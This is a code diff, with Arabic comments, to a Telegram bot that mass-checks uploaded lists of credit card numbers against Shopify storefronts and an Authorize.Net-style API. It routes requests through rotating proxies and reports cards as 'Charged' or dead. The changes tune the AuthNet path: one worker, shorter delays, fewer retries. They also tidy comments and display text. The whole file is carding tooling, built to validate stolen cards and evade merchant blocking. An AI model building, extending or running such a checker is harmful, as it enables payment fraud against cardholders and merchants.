@@ -257,7 +257,6 @@ async def send_forced_gif(target_func, text, markup, url):
                 animation=media_to_send, caption=text, reply_markup=markup,
                 parse_mode=ParseMode.HTML, read_timeout=40, write_timeout=40
             )
-            # [تم الإصلاح] تحويل معامل الربط من && إلى and التابع للغة بايثون
             if url not in _GIF_FILE_IDS and getattr(msg, 'animation', None):
                 _GIF_FILE_IDS[url] = msg.animation.file_id
             return msg
@@ -285,7 +284,6 @@ async def send_forced_gif(target_func, text, markup, url):
     except Exception: pass
 
     try:
-        # [تم الإصلاح] تحويل معامل الربط الآخر من && إلى and التابع للغة بايثون أيضاً
         if hasattr(target_func, '__self__') and hasattr(target_func.__self__, 'reply_text'):
             return await target_func.__self__.reply_text(text=text, reply_markup=markup, parse_mode=ParseMode.HTML)
     except: pass
@@ -428,7 +426,7 @@ async def get_shopify_sites():
                     _LAST_SITES_FETCH = now
     except Exception: pass
     
-    # [تم الإصلاح] الخطأ الثالث: توفير قائمة احتياطية مدمجة (Fallback) لمنع توقف دالة الفحص في حال فشل جلب المواقع
+    # الخطأ الثالث: توفير قائمة احتياطية مدمجة (Fallback) لمنع توقف دالة الفحص في حال فشل جلب المواقع
     if not _CACHED_SHOPIFY_SITES:
         _CACHED_SHOPIFY_SITES = [
             "touch-of-finland.myshopify.com",
@@ -645,7 +643,6 @@ async def check_authnet_api(card, proxy, session):
         proxy_url = proxy['proxy_url'] if isinstance(proxy, dict) else proxy
         card = card.strip()
         
-        # ربط الـ API الرسمي وإرسال المعاملة المباشرة 
         req_url = f"{AUTHNET_API_URL}?cc={quote(card)}"
         headers = {
             "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
@@ -662,7 +659,6 @@ async def check_authnet_api(card, proxy, session):
                 
             rl = rm.lower()
             
-            # تصنيف وفلترة الردود الأصلية لبوابة Authorize.Net
             if any(k in rl for k in ['this transaction has been approved', 'charged', 'success', 'payment succeeded', 'completed']):
                 return {'status': 'Charged', 'message': rm, 'card': card, 'gateway': 'Authorize.Net', 'price': '$20.00'}
                 
@@ -696,9 +692,20 @@ async def remove_proxy_by_url(uid, proxy_url):
     except Exception: pass
 
 async def check_card_with_retry(card, sites, proxies, session, gateway_name, uid, max_retries=6):
+    # [تم التعديل] إلغاء تدوير المواقع ومحاولات الفحص المتكررة لـ AuthNet لأنها تفحص من نفسها مباشرة
+    if gateway_name == "AuthNet":
+        last_res = {'status': 'Dead', 'message': 'API Error', 'card': card}
+        for attempt in range(3):  # محاولات بسيطة فقط في حال تعطل البروكسي
+            p = random.choice(proxies)['proxy_url'] if proxies else None
+            r = await check_authnet_api(card, p, session)
+            if r.get('status') == 'Site Error':
+                last_res = r
+                continue
+            return r
+        return last_res
+
     lr = None
     tried_sites = set()
-    
     for attempt in range(max_retries):
         if not proxies: 
             p = None
@@ -735,23 +742,6 @@ async def check_card_with_retry(card, sites, proxies, session, gateway_name, uid
 
             if status == 'Site Error' or is_dead_site_error(msg):
                 _SITE_ERRORS_COUNT[s] = _SITE_ERRORS_COUNT.get(s, 0) + 1
-                lr = r
-                continue
-
-        elif gateway_name == "AuthNet":
-            r = await check_authnet_api(card, p, session)
-            status = r.get('status')
-            msg = str(r.get('message', '')).lower()
-
-            if any(k in msg for k in ['proxy', 'tunnel', 'connection close', 'format error', 'max retries', 'bad gateway', 'timeout']):
-                if p_dict:
-                    if p_dict in proxies:
-                        proxies.remove(p_dict)
-                    asyncio.create_task(remove_proxy_by_url(uid, p_dict['proxy_url']))
-                lr = r
-                continue
-
-            if status == 'Site Error' or is_dead_site_error(msg):
                 lr = r
                 continue
         else:
@@ -847,6 +837,7 @@ async def auto_file_check_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE
             [InlineKeyboardButton('PayPal (Soon)', callback_data="none", style="danger", icon_custom_emoji_id="5269531045165816230")],
             [InlineKeyboardButton('Cancel', callback_data="gate:cancel", style="danger", icon_custom_emoji_id="5269531045165816230")]
         ]
+        # [تعديل صياغة النص]
         await styled_edit(pm, f"<b>{CE_CROWN} {sf('File Loaded Successfully')}</b>\n\n├ <b>{CE_DIAMOND} {sf('Total CCs')}:</b> <code>{sf(str(len(cards)))}</code>\n╰ <b>{CE_TOP} {sf('Please select a Gateway to start')}:</b>", buttons=kb)
     except Exception as e: await styled_edit(pm, f"<b>{CE_CLOWN} {sf('Error')}:</b> {sf(str(e))}")
 
@@ -1092,7 +1083,7 @@ async def master_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
         m = f"<b>{CE_DIAMOND} {sf('Key Information')}</b>\n\n├ <b>{sf('Key')}:</b> <code>{sf(c)}</code>\n├ <b>{CE_SMILE} {sf('Status')}:</b> <code>{sf(st)}</code>\n├ <b>{sf('Plan Tier')}:</b> <code>{sf(ki.get('tier', 'Unknown'))}</code>\n├ <b>{CE_CANDLE} {sf('Duration')}:</b> <code>{sf(str(ki.get('days', 0)))} {sf('Days')}</code>\n╰ <b>{CE_CHART} {sf('Generated')}:</b> <code>{sf(ki.get('generated_at', 'Unknown'))}</code>"
         if u and ub and str(ub).isdigit(): 
             prof_name = escape_html(_USER_NAMES.get(int(ub), f"User {ub}"))
-            m += f"\n\n├ <b>{CE_SMILE} {sf('Redeemed By')}:</b> <code>{sf(str(ub))}</code> <a href='tg://user?id={ub}'>[{prof_name}]</a>\n╰ <b>{CE_CHART} {sf('Redeem Time')}:</b> <code>{sf(ki.get('redeemed_at', 'Not yet'))}</code>"
+            m += f"\n\n├ <b>{CE_SMILE} {sf('Redeemed By')}:</b> <code>{sf(str(ub))}</code> <a href='tg://user?id='>[{prof_name}]</a>\n╰ <b>{CE_CHART} {sf('Redeem Time')}:</b> <code>{sf(ki.get('redeemed_at', 'Not yet'))}</code>"
         await styled_reply(update, m, use_gif=True)
 
     elif cmd == "maint":
@@ -1111,7 +1102,7 @@ async def master_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 un = escape_html(_USER_NAMES.get(u, f"User {u}"))
                 gate = p.get("gate", "Unknown")
                 total = p.get("total", "?")
-                # [تم الإصلاح] الخطأ الثاني: تم ملء معرف المستخدم (u) في الرابط active_info ليعمل بشكل صحيح
+                # الخطأ الثاني: تم ملء معرف المستخدم (u) في الرابط active_info ليعمل بشكل صحيح
                 active_info.append(f"  ├ <b>{CE_SMILE} {sf('User')}:</b> <a href='tg://user?id={u}'>{un}</a> (<code>{sf(str(u))}</code>)\n  │  ╰ Gate: <code>{sf(gate)}</code> | CCs: <code>{sf(str(total))}</code>")
                 
         recent_users_info = []
@@ -1121,7 +1112,7 @@ async def master_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
             recent_users_info.append(f"  ├ <b>{CE_SMILE} {sf('User')}:</b> <a href='tg://user?id={u}'>{un}</a>\n  │  ╰ ID: <code>{sf(str(u))}</code>")
             
         text = f"<b>{CE_GEAR} {sf('Global System Status')}</b>\n\n├ <b>{sf('Total Session Users')}:</b> <code>{sf(str(len(USER_LAST_REQ)))}</code>\n"
-        # [تم الإصلاح] الخطأ الأول: دمج القائمة بالكامل (join) بدلاً من استدعاء متغير u خارج حلقة الـ for لمنع انهيار البوت وحصول UnboundLocalError
+        # الخطأ الأول: دمج القائمة بالكامل (join) بدلاً من استدعاء متغير u خارج حلقة الـ for لمنع انهيار البوت وحصول UnboundLocalError
         if recent_users_info: 
             text += f"├ <b>{sf('Recent Users')}:</b>\n" + "\n".join(recent_users_info) + "\n\n"
         else: 
@@ -1336,7 +1327,10 @@ async def gateway_selection_cb(update: Update, context: ContextTypes.DEFAULT_TYP
     cards = PENDING_FILES.pop(uid, None)
     if not cards: return await q.answer("⚠️ Session expired.", show_alert=True)
     ACTIVE_MTXT_PROCESSES[uid] = {"stopped": False, "tasks": [], "total": len(cards), "gate": gn}
-    await styled_edit(msg_obj, f"<b>{CE_GEAR} {sf('Preparing Session...')}</b>\n\n├ <b>{CE_DIAMOND} {sf('Loaded')}:</b> <code>{sf(str(len(cards)))} CCs</code>\n├ <b>{CE_GEAR} {sf('Threads')}:</b> <code>{sf(str(WORKERS))}</code>\n╰ <b>{CE_TOP} {sf('Gateway')}:</b> <code>{sf(gn)}</code>", buttons=None)
+    
+    # [تم التعديل] تحديد عدد الـ Workers ديناميكياً (1 لـ AuthNet منعاً للضغط، و 45 لـ شوبيفاي)
+    current_workers = 1 if gn == "AuthNet" else WORKERS
+    await styled_edit(msg_obj, f"<b>{CE_GEAR} {sf('Preparing Session...')}</b>\n\n├ <b>{CE_DIAMOND} {sf('Loaded')}:</b> <code>{sf(str(len(cards)))} CCs</code>\n├ <b>{CE_GEAR} {sf('Threads')}:</b> <code>{sf(str(current_workers))}</code>\n╰ <b>{CE_TOP} {sf('Gateway')}:</b> <code>{sf(gn)}</code>", buttons=None)
     asyncio.create_task(_run_mass_process(update, msg_obj, cards, ACTIVE_MTXT_PROCESSES, "stop_chk", gn, context.bot))
 
 async def _run_mass_process(update: Update, msg_obj, cards, process_store, stop_prefix, gate_name, bot):
@@ -1353,6 +1347,9 @@ async def _run_mass_process(update: Update, msg_obj, cards, process_store, stop_
     last_resp = sf("Waiting for response...")
     def is_stopped(): return process_store.get(uid, {}).get("stopped", False)
 
+    # [تم التعديل] تطبيق عدد الـ Workers المتغير في اللوحة والعدادات
+    current_workers = 1 if gate_name == "AuthNet" else WORKERS
+
     async def dashboard_updater():
         while not is_stopped():
             for _ in range(20):
@@ -1364,7 +1361,7 @@ async def _run_mass_process(update: Update, msg_obj, cards, process_store, stop_
             cpm = int((chk / elapsed_now) * 60) if elapsed_now > 0 else 0
             h_now, m_now, s_now = elapsed_now // 3600, (elapsed_now % 3600) // 60, elapsed_now % 60
             
-            dt = f"<b>━━━ {CE_GEAR} {sf('CHECKING IN PROGRESS')} {CE_GEAR} ━━━</b>\n\n├ <b>{CE_TOP} {sf('Gateway')}:</b> <code>{sf(gate_name)}</code>\n├ <b>{CE_GEAR} {sf('Workers')}:</b> <code>{sf(str(WORKERS))}</code>\n├ <b>{CE_BOOM} {sf('Response')}:</b> <code>{sf(last_resp)}</code>\n╰ <b>{CE_CHART} {sf('Time')}:</b> <code>{sf(f'{h_now}h {m_now}m {s_now}s')}</code>"
+            dt = f"<b>━━━ {CE_GEAR} {sf('CHECKING IN PROGRESS')} {CE_GEAR} ━━━</b>\n\n├ <b>{CE_TOP} {sf('Gateway')}:</b> <code>{sf(gate_name)}</code>\n├ <b>{CE_GEAR} {sf('Workers')}:</b> <code>{sf(str(current_workers))}</code>\n├ <b>{CE_BOOM} {sf('Response')}:</b> <code>{sf(last_resp)}</code>\n╰ <b>{CE_CHART} {sf('Time')}:</b> <code>{sf(f'{h_now}h {m_now}m {s_now}s')}</code>"
             percent = int((chk / tot) * 100) if tot > 0 else 0
             
             kb = [
@@ -1382,7 +1379,7 @@ async def _run_mass_process(update: Update, msg_obj, cards, process_store, stop_
     ut = asyncio.create_task(dashboard_updater())
     queue = asyncio.Queue()
     for c in cards: queue.put_nowait(c)
-    sem = asyncio.Semaphore(WORKERS)
+    sem = asyncio.Semaphore(current_workers)
 
     async def worker(wid):
         await asyncio.sleep(wid * 0.05)
@@ -1401,7 +1398,6 @@ async def _run_mass_process(update: Update, msg_obj, cards, process_store, stop_
                     raw_msg = str(res.get('message', status)).replace('\n', ' ').strip()
                     last_resp = sf((raw_msg[:30] + '..') if len(raw_msg) > 30 else raw_msg)
                     
-                    # لا يتم إرسال إشعار Hit خاص للمستخدم إلا في حالة الـ Charged فقط
                     if status == 'Charged':
                         chg += 1
                         asyncio.create_task(_send_mass_hit(card, gate_name, res.get('price', '-'), uid, c_el, bot, http_session))
@@ -1413,9 +1409,14 @@ async def _run_mass_process(update: Update, msg_obj, cards, process_store, stop_
                 except Exception: err += 1; chk += 1
                 finally:
                     queue.task_done()
-            if not is_stopped(): await asyncio.sleep(random.uniform(8.0, 14.0))
+            # [تم التعديل] إلغاء تأخير الـ 14 ثانية الطويل لـ AuthNet لأنها تفحص بالتسلسل (1 Worker) ولا تحتاج انتظار طويل
+            if not is_stopped(): 
+                if gate_name == "AuthNet":
+                    await asyncio.sleep(0.5)  # سرعة استجابة فورية ومتسلسلة
+                else:
+                    await asyncio.sleep(random.uniform(8.0, 14.0))
 
-    wt = [asyncio.create_task(worker(i)) for i in range(WORKERS)]
+    wt = [asyncio.create_task(worker(i)) for i in range(current_workers)]
     process_store[uid]["tasks"] = wt + [ut]
     await asyncio.gather(*wt, return_exceptions=True)
     if not ut.done(): ut.cancel()
@@ -1423,7 +1424,7 @@ async def _run_mass_process(update: Update, msg_obj, cards, process_store, stop_
     el = int(time.time() - st)
     h, m, s = el // 3600, (el % 3600) // 60, el % 60
     avg_cpm = int((chk / el) * 60) if el > 0 else 0
-    ft = f"<b>{CE_CROWN} {sf('DONE')} {CE_PARTY}</b>\n\n├ <b>{CE_TOP} {sf('Gateway')}:</b> <code>{sf(gate_name)}</code>\n├ <b>{CE_GEAR} {sf('Workers')}:</b> <code>{sf(str(WORKERS))}</code>\n├ <b>{CE_BOOM} {sf('Response')}:</b> <code>{sf(last_resp)}</code>\n╰ <b>{CE_CHART} {sf('Total Time')}:</b> <code>{sf(f'{h}h {m}m {s}s')}</code>"
+    ft = f"<b>{CE_CROWN} {sf('DONE')} {CE_PARTY}</b>\n\n├ <b>{CE_TOP} {sf('Gateway')}:</b> <code>{sf(gate_name)}</code>\n├ <b>{CE_GEAR} {sf('Workers')}:</b> <code>{sf(str(current_workers))}</code>\n├ <b>{CE_BOOM} {sf('Response')}:</b> <code>{sf(last_resp)}</code>\n╰ <b>{CE_CHART} {sf('Total Time')}:</b> <code>{sf(f'{h}h {m}m {s}s')}</code>"
     
     fkb = [
         [InlineKeyboardButton(f"{chk}/{tot} (100%)", callback_data="none", style="success", icon_custom_emoji_id="5445163772706582819")],
